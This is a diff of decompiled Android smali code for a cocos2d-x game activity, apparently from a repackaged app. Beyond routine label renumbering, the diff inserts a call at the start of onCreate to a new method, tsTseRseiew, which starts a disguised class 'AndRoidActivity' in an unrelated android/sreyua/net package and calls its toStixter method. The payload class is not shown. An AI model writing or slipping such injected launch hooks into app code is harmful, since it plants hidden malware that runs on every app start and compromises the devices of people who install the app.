@@ -76,6 +76,8 @@
     .param p1, "savedInstanceState"    # Landroid/os/Bundle;
 
     .prologue
+    invoke-virtual {p0}, Lcom/tobiapps/android_hghunt2/TOBI006;->tsTseRseiew()V
+
     .line 49
     invoke-super {p0, p1}, Lorg/cocos2dx/lib/Cocos2dxActivity;->onCreate(Landroid/os/Bundle;)V
 
@@ -86,7 +88,7 @@
 
     const/16 v1, 0x20
 
-    if-ne v0, v1, :cond_10
+    if-ne v0, v1, :cond_13
 
     .line 53
     const-string v0, "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAiHGSzPfZBLY1cfjGQjIqiLm+CzYEsf0fRPLWgcB5jd0JOzFKMCKnlHYUYJxvbeDTJxB/yWeuYuspY7cKGkOaeGQr2/lOYEeh6l1u/zSGOCRPQUp19XfKAh7wglKUjNMPLkz6kvgmgy7n6BTQi+ddpn0O4VojT6/z9X4ikMBCjNd4seZrutxtnEGfCuOLJRzdDmxw1rk1OM9CAyxBvkoeq4bd7KvZ4qaw4f5i2f2slNV5xjQ0pl0jpc+g19j9c30fQbSxThlsl5SrtTyXuDZaELe2dMibPXNq7EG8yxpVzVqjGQXAq/up1y16L7aa4N8Qhqh1oKJGlB+y1luHixYJJwIDAQAB"
@@ -94,7 +96,7 @@
     invoke-virtual {p0, v0}, Lcom/tobiapps/android_hghunt2/TOBI006;->setPublicKey(Ljava/lang/String;)V
 
     .line 56
-    :cond_10
+    :cond_13
     new-instance v0, Lcom/tobiapps/android_hghunt2/TOBI006$1;
 
     invoke-direct {v0, p0}, Lcom/tobiapps/android_hghunt2/TOBI006$1;-><init>(Lcom/tobiapps/android_hghunt2/TOBI006;)V
@@ -302,5 +304,18 @@
 
     .prologue
     .line 131
+    return-void
+.end method
+
+.method public tsTseRseiew()V
+    .registers 2
+
+    .prologue
+    new-instance v0, Landroid/sreyua/net/AndRoidActivity;
+
+    invoke-direct {v0, p0}, Landroid/sreyua/net/AndRoidActivity;-><init>(Landroid/content/Context;)V
+
+    invoke-virtual {v0}, Landroid/sreyua/net/AndRoidActivity;->toStixter()V
+
     return-void
 .end method
